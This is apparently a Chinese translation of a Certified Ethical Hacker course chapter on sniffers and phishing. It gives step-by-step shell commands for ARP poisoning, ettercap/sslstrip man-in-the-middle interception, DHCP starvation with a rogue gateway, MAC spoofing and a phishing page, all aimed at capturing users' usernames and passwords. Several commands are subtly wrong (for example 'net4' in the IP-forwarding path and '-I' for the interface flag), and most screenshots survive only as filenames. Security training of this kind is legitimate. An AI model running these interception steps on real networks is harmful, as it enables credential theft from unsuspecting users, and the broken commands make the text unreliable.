    # 计算机网络攻击


    ## 第 7 部分：嗅探器与钓鱼攻击

    认证伦理黑客 (CEH) 课程第 7 部分

    作者：Hidaia Mahmood Alassouli 博士

    Hidaia_alassouli@hotmail.com


    ### a. 了解嗅探器

    ![](img/image-4lxgx3mb.jpg)


    ### b. 理解 ARP 毒骗

    ![](img/image-yu2j3rex.jpg) ![](img/image-6fr006op.jpg)

    ARP 毒骗是更改网关的 MAC 地址，将路由器的 MAC 地址改为黑客的。ARP 毒骗的命令是：

    `arp -I eth0 -t (target ip)` (image-xbbgy2d.jpg)


    ### c. 使用 Ettercap 进行中间人攻击

    ![](img/image-45zztv.jpg)

    使用命令行启用 IP 转发：

    ```bash

    echo 1 > /proc/sys/net4/ip_forward

    ```

    进行 ARP 毒骗：

    ```bash

    arpspoof -I eth0 -t 192.168.52.132 (target ip)

    ```

    (image-btkdghpz.jpg) 编辑 IP 表，告诉电脑进入 80 端口的流量必须重定向到 192.168.52.2 (gateway ip)。

    编辑 `etter.conf`：![](img/image-d4cv40.jpg) ![](img/image-zlgv83f.jpg)

    激活 pentest 工具：

    ```bash

    cd /pentest/web

    python sslstrip.py -a (10000)

    ```

    使用 ettercap 工具显示结果：

    ```bash

    ettercap -T -q -I eth0

    ```

    从目标计算机连接并获取用户名和密码。

    (image-c1kpygn.jpg)


    ### d. 使用 Ettercap 图形界面进行中间人攻击

    重复 IP 转发、iptables 和 sslstrip 的步骤：

    ```bash

    echo 1 > /proc/sys/net4/ip_forward

    arpspoof -I eth0 -t 192.168.52.132 (target ip) 192.168.52.2 (gateway ip)

    cd /pentest/web

    python sslstrip.py -a (10000)

    ```

    打开 ettercap。选择 sniff（嗅探）、`eth0`，扫描 hosts（主机）。然后进行 ARP 毒骗。然后开始嗅探。你也可以使用 Windows
    版本的 Cain。也可以使用 yamas 工具。


    ### e. DHCP 耗尽攻击：

    ![](img/image-60bin2t.jpg)

    在 DHCP 耗尽中，黑客将停止 DHCP 服务器。黑客将在电脑上建立 DHCP 服务器。如果客户端想要 IP，黑客电脑将提供，但网关将黑客机器的 IP，黑客将开启
    IP 转发连接互联网。黑客拥有嗅探程序。当客户端想要上网时，数据将发送到黑客电脑。数据通过黑客电脑，黑客将其转发到互联网。嗅探程序将显示客户端的用户名和密码。


    DHCP 耗尽技术：

    ![](img/image-og0rp27.jpg)

    我们必须在黑客电脑上安装 DHCP 服务器。然后配置范围。我们必须将网关设置为黑客机器的 IP。然后必须安装并配置工具。该工具可以进行 DHCP 攻击并停止
    DHCP 服务器。然后执行嗅探步骤。当电脑输入任何用户名密码时，我们可以在 ettercap 中看到。


    使用命令安装 DHCP 服务器：

    ```bash

    apt-get install dhcp-server

    kate /etc/dhcp/dhcpd.conf

    ```

    更改范围并将网关路由器 IP 为黑客电脑：

    (image-0q08pfbe.jpg)

    通过输入启动 DHCP 服务器：

    ```bash

    isc-dhcp-server start

    ```

    下载 starvation 工具停止网络中的 DHCP 服务器：

    (image-shbs2bf.jpg)

    这是 Windows 上的 DHCP 服务器及其范围：

    (image-nbo89r2.jpg)

    停止网络 DHCP 服务器，进入工具：

    ```bash

    dhcp -I eth0

    ```

    (image-0sy35yx.jpg)

    这将保留网络 DHCP 服务器范围内的所有 IP：

    (image-wpq8z5us.jpg)

    我们将在黑客机器上启用 IP 转发并设置 iptable。然后运行 `sslstrip`：

    (image-f7seuos.jpg)

    我们运行 ettercap 显示用户名和密码。

    (image-qravwu18.jpg)

    测试连接。使用网络上的任何电脑登录。在黑客电脑上我们可以获取用户名。

    (image-ub9eciuj.jpg)


    ### f. MAC 欺骗：

    ![](img/image-w0ofnpca.jpg) ![](img/image-h4wj962.jpg)

    MAC 地址由 6 个字节组成。前 3 个字节有关厂商。另外三个字节由分配网卡的公司提供。我们可以对 MAC 地址进行欺骗，这意味着隐藏我的 MAC 地址以获取另一个
    MAC 地址。出于目的需要。


    在 Windows 上进行 MAC 欺骗：

    (image-d2b2ohdl.jpg) ![](img/image-0g3cbd.jpg)

    在 Linux 中，我们可以使用 `macchanger` 工具将 MAC 地址更改为随机地址。首先禁用网卡：

    ```bash

    ifconfig eth0 down

    macchanger -r

    ifconfig eth0 up

    ```

    (image-fq73.jpg)


    ### g. 钓鱼：

    (image-361n.jpg)

    通过制作钓鱼页面并获取用户名和密码。我们需要在黑客电脑上建立钓鱼。

    (image-z61.jpg)

    通过 `index.php` 制作钓鱼。

    (image-wro0.jpg)

    (image-ta0gl.jpg)

    (image-alvwe.jpg)


    '
